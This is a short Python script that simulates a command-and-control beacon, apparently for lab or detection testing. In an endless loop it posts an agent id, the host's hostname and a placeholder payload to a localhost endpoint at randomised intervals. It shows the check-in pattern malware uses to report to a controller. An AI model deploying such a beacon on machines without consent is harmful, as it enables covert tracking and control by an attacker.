import requests, time, random, base64, socket

C2_URL = "http://127.0.0.1:8000/beacon"

while True:
    payload = base64.b64encode(b"C2 Beacon Signal").decode()

    data = {
        "agent_id": "agent-001",
        "hostname": socket.gethostname(),
        "payload": payload
    }

    try:
        r = requests.post(C2_URL, json=data)
        print("Sent:", r.status_code, data)
    except Exception as e:
        print("Error:", e)

    time.sleep(10 + random.randint(3,7))
